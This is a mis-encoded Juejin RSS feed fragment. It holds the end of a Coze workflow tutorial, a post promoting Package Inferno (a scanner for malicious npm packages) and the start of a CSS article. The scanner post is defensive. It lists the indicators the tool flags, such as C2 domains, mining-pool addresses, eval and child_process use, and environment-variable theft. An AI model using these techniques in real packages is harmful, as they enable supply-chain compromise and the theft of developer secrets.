<h3 data-id="heading-13">2.12. ä¸Šä¼ å›¾ç‰‡åˆ°å°ç»¿ä¹¦</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ä½¿ç”¨åˆ°äº†æ‰£å­ä¸‰æ–¹æ’ä»¶ã€å¾®ä¿¡å…¬ä¼—å·æ¥å£ã€‘çš„ã€wx_upload_imageã€‘å·¥å…·ï¼Œç”¨äºæŠŠäºŒåˆ›åçš„é…å›¾ä¸Šä¼ åˆ°å°ç»¿ä¹¦ä¸­ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1cf8545122df42da98ac900dca35d3d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=GtWpYeqBgo2AqWfvXslvdrgytSo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">2.13. å›¾ç‰‡è½¬æˆå°ç»¿ä¹¦æ ¼å¼</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥æŠŠä¸Šä¼ å›¾ç‰‡æ‹¿åˆ°çš„ç»“æœè½¬æˆå°ç»¿ä¹¦å›¾ç‰‡çš„æ ¼å¼ï¼Œä½¿ç”¨åˆ°äº†ä¸‰æ–¹æ’ä»¶ã€å¾®ä¿¡å…¬ä¼—å·å·¥å…·ç®±ã€‘çš„ã€np_media_id_convert_to_objã€‘å·¥å…·ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c22cd72ecde3461cb5edbe6a6a1fb6ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=ZuAJJfyTSQBv5t9OCsuikO5v84Y%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-15">2.14. å›¾ç‰‡åˆ—è¡¨ä¿¡æ¯è½¬æˆå°ç»¿ä¹¦è‰ç¨¿æ ¼å¼</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨äºå°†ä¸Šä¼ åˆ°å°ç»¿ä¹¦åçš„å›¾ç‰‡çš„åˆ—è¡¨è½¬æˆæ·»åŠ è‰ç¨¿æ—¶éœ€è¦çš„æ ¼å¼ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­ä¸‰æ–¹æ’ä»¶ã€å¾®ä¿¡å…¬ä¼—å·å·¥å…·ç®±ã€‘çš„ã€np_image_obj_list_2_objã€‘å·¥å…·ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be11d9268e0849d59acc650d9321c81a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=mxLfH%2BO3wyA7VCrHFoExZjNUMiA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-16">2.15. æ·»åŠ å°ç»¿ä¹¦è‰ç¨¿</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥ç”Ÿæˆå°ç»¿ä¹¦çš„è‰ç¨¿ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­ä¸‰æ–¹æ’ä»¶ã€å¾®ä¿¡å…¬ä¼—å·æ¥å£ã€‘çš„ã€add_newspic_draftã€‘å·¥å…·ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30d520974e2844b7b9a9dbac17b47776~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=eY4yk4UGgpDei4H99rUN%2BxOOqEA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-17">2.16. ç»“æŸ</h3>
<p>ç»“æŸèŠ‚ç‚¹ï¼Œmedia_idæœ‰å€¼è¯´æ˜æ·»åŠ åˆ°å°ç»¿ä¹¦è‰ç¨¿æˆåŠŸï¼Œnote_titleã€note_contentã€note_imagesè¿™äº›ä¿¡æ¯ï¼Œå¦‚æœä½ éœ€è¦å‘å°çº¢ä¹¦çš„è¯ï¼Œå¯ä»¥æ‹·è´è¿™äº›ä¿¡æ¯å»å‘é€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bece877f380347d4909e4c6b90e8ed00~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=4K%2FmIn5m%2FXLDsWJOEFdz4ILIdpw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-18">3. æ€»ç»“</h2>
<p>æœ¬æ–‡è¯¦ç»†åœ°ä»‹ç»äº†å¦‚ä½•å¯¹å°çº¢ä¹¦ç¬”è®°è¿›è¡ŒäºŒåˆ›ï¼Œå¹¶ä¸”å®ç°äº†ä¸€é”®å‘å¸ƒåˆ°å°ç»¿ä¹¦ï¼Œæ–‡ä¸­å¯¹æ•´ä¸ªæ‰£å­å·¥ä½œæµåšäº†æ‹†è§£ï¼Œè¿™ä¸ªå·¥ä½œæµä½¿ç”¨åˆ°äº†è¾ƒå¤šå¤§æ¨¡å‹æ¥å¯¹æ•°æ®è¿›è¡Œå¤„ç†ï¼Œå› æ­¤éœ€è¦ç¼–å†™è¾ƒå¤šçš„æç¤ºè¯ã€‚</p>
<p>æœ¬å·¥ä½œæµä½¿ç”¨åˆ°çš„æç¤ºè¯è¾ƒå¤šï¼Œå—é™äºæ–‡ç« ç¯‡å¹…ï¼Œæ²¡æœ‰åˆ—å‡ºï¼Œå¾é³´å·²ç»æŠŠæ‰€æœ‰æç¤ºè¯æ‰“å¥½åŒ…ï¼Œéœ€è¦çš„æœ‹å‹å¯ä»¥æ–‡ç« ä¸‰è¿åï¼Œè¯„è®ºåŒºç•™è¨€â€œçº¢åˆ°ç»¿â€ï¼Œå¹¶ä¸”åå°ç§ä¿¡â€œçº¢åˆ°ç»¿â€è·å–ã€‚</p>
<p>æœ¬æ–‡çš„åˆ†äº«å°±åˆ°è¿™é‡Œï¼Œå¦‚æœæ‚¨è§‰å¾—æœ‰æ”¶è·çš„è¯ï¼Œå¯ä»¥ç»™ä¸ªä¸€é”®ä¸‰è¿ï¼Œæ‚¨çš„é¼“åŠ±æ˜¯å¾é³´æŒç»­è¾“å‡ºçš„æœ€å¤§åŠ¨åŠ›ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a185b21cb70424b8c66ef79eb696d2d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=2ukiEbJTVhtirAgQBQjvzUpd9BU%3D" alt="" loading="lazy"/></p>
<p>æœ€è¿‘å®æˆ˜äº†ä¸€äº›æ‰£å­ï¼ˆCozeï¼‰å·¥ä½œæµç›¸å…³çš„æ¡ˆä¾‹ï¼ŒåŒ…å«å°çº¢è–¯å›¾æ–‡ç”Ÿæˆã€çˆ†æ¬¾è§†é¢‘å‰ªè¾‘ã€åŠå…¬ææ•ˆç­‰æ‰£å­æ¡ˆä¾‹ï¼Œå†…é™„è¯¦ç»†çš„æ•™ç¨‹å’Œå·¥ä½œæµå®‰è£…åŒ…ï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥æ¥ä¸ª<strong>ä¸€é”®ä¸‰è¿ï¼ˆå¿…é¡»åŠ¨ä½œï¼‰</strong> ï¼Œæ–‡ç« è¯„è®ºåŒºè¯„è®ºâ€œ<strong>æ‰£å­æ¡ˆä¾‹</strong>â€é¢†å–ï¼ˆè¿™äº›æ¡ˆä¾‹ä¸åŒ…å«æœ¬æ–‡åˆ†äº«çš„æ¡ˆä¾‹ï¼Œå¦‚æœéœ€è¦æœ¬æ–‡åˆ†äº«çš„æ¡ˆä¾‹å®‰è£…åŒ…å¯ä»¥åå°ç§ä¿¡æˆ‘ï¼‰ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€å¼€æºé¡¹ç›®æ¨èã€‘Package-Infernoï¼šä¸€ä¸ªè®©ä½ çœ‹é€ npm åŒ…â€œçœŸé¢ç›®â€çš„å¼€æºç¥å™¨]]></title>    <link>https://juejin.cn/post/7594303923362103336</link>    <guid>https://juejin.cn/post/7594303923362103336</guid>    <pubDate>2026-01-13T02:03:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594303923362103336" data-draft-id="7594303825014259727" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€å¼€æºé¡¹ç›®æ¨èã€‘Package-Infernoï¼šä¸€ä¸ªè®©ä½ çœ‹é€ npm åŒ…â€œçœŸé¢ç›®â€çš„å¼€æºç¥å™¨"/> <meta itemprop="keywords" content="å‰ç«¯,GitHub"/> <meta itemprop="datePublished" content="2026-01-13T02:03:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯å°å°æ ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1081575170131006"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€å¼€æºé¡¹ç›®æ¨èã€‘Package-Infernoï¼šä¸€ä¸ªè®©ä½ çœ‹é€ npm åŒ…â€œçœŸé¢ç›®â€çš„å¼€æºç¥å™¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1081575170131006/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯å°å°æ ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:03:59.000Z" title="Tue Jan 13 2026 02:03:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025ï½2026 å¹´è¿™æ®µæ—¶é—´ï¼Œnpm ä¾›åº”é“¾æ”»å‡»äº‹ä»¶ä»ç„¶å±‚å‡ºä¸ç©·ã€‚</p>
<p>æœ‰äººä¸€ä¸ªæœˆå·å·å¾€ä¸€ä¸ªå·²ç»è¢«å‡ ä¸‡äººä¾èµ–çš„åŒ…é‡Œå¡åé—¨ï¼Œæœ‰äººæŠŠæ¶æ„ä»£ç è—åœ¨ prototype pollution é‡Œï¼Œæœ‰äººç›´æ¥æŠŠ crypto miner ä¼ªè£…æˆæ€§èƒ½ä¼˜åŒ–å·¥å…·â€¦â€¦<br/>
æ™®é€šå¼€å‘è€…é¢å¯¹å‡ ç™¾ä¸Šåƒä¸ªä¾èµ–æ—¶ï¼ŒçœŸçš„å¾ˆéš¾åˆ¤æ–­ä¸€ä¸ªåŒ…åˆ°åº•å®‰ä¸å®‰å…¨ã€‚</p>
<p>è€Œä»Šå¤©è¦ä»‹ç»çš„è¿™ä¸ªå·¥å…·ï¼Œå°±æ˜¯ä¸“é—¨æ¥è§£å†³è¿™ä¸ªç—›ç‚¹çš„â€”â€”<br/>
<strong>Package Inferno</strong><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMHaggis%2FPackage-Inferno" target="_blank" title="https://github.com/MHaggis/Package-Inferno" ref="nofollow noopener noreferrer">github.com/MHaggis/Pacâ€¦</a></p>
<h3 data-id="heading-0">å®ƒåˆ°åº•èƒ½å¹²ä»€ä¹ˆï¼Ÿ</h3>
<p>ä¸€å¥è¯æ€»ç»“ï¼š<br/>
<strong>å®ƒèƒ½æŠŠä¸€ä¸ª npm åŒ…â€œè§£å‰–â€å¾—éå¸¸é€å½»ï¼Œæ¯”ä½ è‚‰çœ¼çœ‹ä»£ç ã€çœ‹ package.jsonã€çœ‹æœ€è¿‘æäº¤è®°å½•è¦æ·±å…¥å¾—å¤šã€‚</strong></p>
<p>ç›®å‰ä¸»è¦æä¾›çš„æ ¸å¿ƒèƒ½åŠ›æœ‰è¿™äº›ï¼š</p>



























































<table><thead><tr><th>æ£€æµ‹ç»´åº¦</th><th>èƒ½å‘ç°ä»€ä¹ˆé—®é¢˜</th><th>éš¾åº¦ï¼ˆäººå·¥ï¼‰</th><th>Package Inferno æ˜¯å¦èƒ½è¾ƒå¥½è¯†åˆ«</th></tr></thead><tbody><tr><td>å¯ç–‘å­—ç¬¦ä¸²/ç¡¬ç¼–ç </td><td>API keyã€wallet addressã€C2 åŸŸåã€çŸ¿æ± åœ°å€ç­‰</td><td>â˜…â˜…â˜†</td><td>éå¸¸å¼º</td></tr><tr><td>åŠ¨æ€ä»£ç æ‰§è¡Œ</td><td>evalã€Functionã€vm.runInNewContext ç­‰é«˜å±å†™æ³•</td><td>â˜…â˜…â˜…</td><td>å¼º</td></tr><tr><td>åŸå‹æ±¡æŸ“</td><td>Object.prototype ç›¸å…³æ“ä½œ</td><td>â˜…â˜…â˜…â˜…</td><td>ä¸­ç­‰ï½å¼º</td></tr><tr><td>è¿›ç¨‹/æ–‡ä»¶ç³»ç»Ÿæ“ä½œ</td><td>child_processã€fs.writeFileã€process.exit ç­‰</td><td>â˜…â˜…</td><td>éå¸¸å¼º</td></tr><tr><td>ç½‘ç»œå¤–è”</td><td>http/https/fetch + å¯ç–‘åŸŸå</td><td>â˜…â˜…</td><td>éå¸¸å¼º</td></tr><tr><td>ç¯å¢ƒå˜é‡çªƒå–</td><td>process.env ç›¸å…³æ“ä½œ + æ•æ„Ÿå…³é”®å­—</td><td>â˜…â˜…â˜…</td><td>å¼º</td></tr><tr><td>ä¼ªè£…/æ··æ·†</td><td>å˜é‡åæé•¿ã€base64 å¤§æ®µå­—ç¬¦ä¸²ã€unicode æ··æ·†ç­‰</td><td>â˜…â˜…â˜…â˜…</td><td>ä¸­ç­‰ï¼ˆä¾èµ–è§„åˆ™è´¨é‡ï¼‰</td></tr><tr><td>ç‰ˆæœ¬é—´è¡Œä¸ºå‰§å˜</td><td>æŸä¸ªç‰ˆæœ¬çªç„¶å¤šäº†å¾ˆå¤šå¥‡æ€ªä»£ç </td><td>â˜…â˜…â˜…â˜…</td><td>æ”¯æŒï¼ˆéœ€é…åˆå†å²ç‰ˆæœ¬å¯¹æ¯”ï¼‰</td></tr></tbody></table>
<h3 data-id="heading-1">å®ƒæ˜¯æ€ä¹ˆåšåˆ°çš„ï¼Ÿ</h3>
<p>Package Inferno çš„å·¥ä½œæµç¨‹å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š</p>
<ol>
<li>è¾“å…¥ â†’ npm åŒ…å + ç‰ˆæœ¬ï¼ˆæˆ–ç›´æ¥ç»™ tarball urlï¼‰</li>
<li>è‡ªåŠ¨ä¸‹è½½ â†’ è§£å‹ tarball</li>
<li>å¤šç»´åº¦æ‰«æï¼ˆç›®å‰ä¸»è¦æœ‰ä¸‰ç±»ï¼‰ï¼š
<ul>
<li>åŸºäºæ­£åˆ™ + å¯å‘å¼çš„å­—ç¬¦ä¸²åŒ¹é…ï¼ˆæœ€å¿«ï¼‰</li>
<li>YARA è§„åˆ™å¼•æ“ï¼ˆæœ€å¼ºå¯æ‰©å±•ï¼‰</li>
<li>éƒ¨åˆ† AST åˆ†æï¼ˆæ­£åœ¨å¿«é€Ÿè¿­ä»£ä¸­ï¼‰</li>
</ul>
</li>
<li>è¾“å‡ºç»“æ„åŒ–çš„ JSON ç»“æœï¼ŒåŒ…å«ï¼š
<ul>
<li>å‘ç°çš„æ¯ä¸€ä¸ªâ€œçº¢æ——â€ï¼ˆred flagï¼‰</li>
<li>å¯¹åº”çš„æ–‡ä»¶è·¯å¾„ + è¡Œå· + å‘½ä¸­è§„åˆ™</li>
<li>ä¸¥é‡æ€§è¯„åˆ†ï¼ˆå¯è‡ªå®šä¹‰ï¼‰</li>
<li>è¯æ®ç‰‡æ®µï¼ˆæ–¹ä¾¿äººå·¥å¤æ ¸ï¼‰</li>
</ul>
</li>
</ol>
<h3 data-id="heading-2">å®é™…ä½¿ç”¨åœºæ™¯ä¸¾ä¾‹</h3>
<p>åœºæ™¯1ï¼šæ–°é¡¹ç›®è¦å¼•å…¥ä¸€ä¸ªå†·é—¨åŒ…<br/>
<code>npx package-inferno lodash.debounce@4.0.8</code><br/>
â†’ å‡ ç§’é’Ÿå‘Šè¯‰ä½ è¿™ä¸ªç‰ˆæœ¬æœ‰æ²¡æœ‰è¢«æŠ•æ¯’</p>
<p>åœºæ™¯2ï¼šå…¬å¸å†…éƒ¨ä¾›åº”é“¾å®‰å…¨å‘¨<br/>
æŠŠæ‰€æœ‰ç”Ÿäº§ä¾èµ–æ‰«ä¸€éï¼Œè¾“å‡º top 20 æœ€å¯ç–‘çš„åŒ…<br/>
â†’ ç›´æ¥ç”ŸæˆæŠ¥å‘Šå‘ç»™å®‰å…¨å›¢é˜Ÿ</p>
<p>åœºæ™¯3ï¼šç ”ç©¶å‹ç©å®¶<br/>
æƒ³ç ”ç©¶æœ€è¿‘ä¸€å¹´æœ‰å“ªäº›åŒ…è¢«æŠ•è¿‡æ¯’ï¼Ÿ<br/>
é…åˆè„šæœ¬æ‰¹é‡æ‹‰å–çƒ­é—¨åŒ…çš„ä¸åŒå†å²ç‰ˆæœ¬ â†’ å¯¹æ¯” delta â†’ æ‰¾è§„å¾‹</p>
<h3 data-id="heading-3">ç›®å‰çš„çŠ¶æ€ï¼ˆ2026å¹´1æœˆï¼‰</h3>
<ul>
<li>é¡¹ç›®éå¸¸æ–°ï¼ˆå…¬å¼€æ—¶é—´ â‰ˆ 2025å¹´åº•ï½2026å¹´åˆï¼‰</li>
<li>è¿˜åœ¨å¿«é€Ÿè¿­ä»£ä¸­ï¼Œè§„åˆ™è¿˜åœ¨ç–¯ç‹‚è¡¥å……</li>
<li>ä½œè€…å¾ˆæ´»è·ƒï¼Œissue å’Œ PR å“åº”å¾ˆå¿«</li>
<li>å·²ç»å¯ä»¥å¼€ç®±å³ç”¨ï¼ˆæ”¯æŒ Docker ä¸€é”®è·‘ï¼‰</li>
<li>ç¤¾åŒºè´¡çŒ®åº¦è¿˜å¾ˆä½ï¼Œæ­£æ˜¯<strong>ç°åœ¨å‚ä¸æœ€æœ‰å½±å“åŠ›</strong>çš„æ—¶å€™</li>
</ul>
<h3 data-id="heading-4">æ€ä¹ˆå¿«é€Ÿä¸Šæ‰‹ï¼Ÿï¼ˆæœ€ç®€å•æ–¹å¼ï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ–¹å¼1ï¼šç›´æ¥ npxï¼ˆæœ€å¿«ï¼‰</span>
npx package-inferno express@4.19.2

<span class="hljs-comment"># æ–¹å¼2ï¼šDockerï¼ˆæ¨èæ‰¹é‡/å…¬å¸ç”¨ï¼‰</span>
docker run -it --<span class="hljs-built_in">rm</span> ghcr.io/mhaggis/package-inferno:latest axios@1.7.7

<span class="hljs-comment"># æ–¹å¼3ï¼šæœ¬åœ°å¼€å‘/æ”¹è§„åˆ™</span>
git <span class="hljs-built_in">clone</span> https://github.com/MHaggis/Package-Inferno.git
<span class="hljs-built_in">cd</span> Package-Inferno
npm install
npm run scan -- axios@1.7.7
</code></pre>
<h3 data-id="heading-5">ä¸€å¥è¯æ€»ç»“</h3>
<p>å¦‚æœä½ ï¼š</p>
<ul>
<li>ç»å¸¸é€‰åŒ…é€‰åˆ°ç„¦è™‘</li>
<li>å…¬å¸æœ‰ä¾›åº”é“¾å®‰å…¨è¦æ±‚</li>
<li>å¯¹ npm æ¶æ„åŒ…æŠ•æ¯’åŸç†æ„Ÿå…´è¶£</li>
</ul>
<p>é‚£ä¹ˆ <strong>Package Inferno</strong> éå¸¸å€¼å¾—ä½ ä»Šå¤©å°± star + clone ä¸€ä»½ï¼Œé—²æš‡æ—¶è·‘è·‘è‡ªå·±é¡¹ç›®é‡Œçš„ä¾èµ–ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æŒ–å‡ºä¸€äº›â€œæƒŠå–œâ€ã€‚</p>
<p>å®‰å…¨ï¼Œä»å®¡è§†æ¯ä¸€ä¸ªä¾èµ–å¼€å§‹ã€‚<br/>
ç¥å¤§å®¶ 2026 å¹´éƒ½èƒ½ç”¨ä¸Šå¹²å‡€çš„ npm åŒ…ï½</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯å¸ƒå±€ç¬”è®°ï¼šSticky Footer (ç²˜æ€§é¡µè„š) å®Œç¾è§£å†³æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7594322573453328427</link>    <guid>https://juejin.cn/post/7594322573453328427</guid>    <pubDate>2026-01-13T02:20:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594322573453328427" data-draft-id="7594302398687084598" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯å¸ƒå±€ç¬”è®°ï¼šSticky Footer (ç²˜æ€§é¡µè„š) å®Œç¾è§£å†³æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,CSS"/> <meta itemprop="datePublished" content="2026-01-13T02:20:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç‹¬å®ˆä¸€éš…"/> <meta itemprop="url" content="https://juejin.cn/user/2963939079500248"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯å¸ƒå±€ç¬”è®°ï¼šSticky Footer (ç²˜æ€§é¡µè„š) å®Œç¾è§£å†³æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2963939079500248/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç‹¬å®ˆä¸€éš…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:20:10.000Z" title="Tue Jan 13 2026 02:20:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
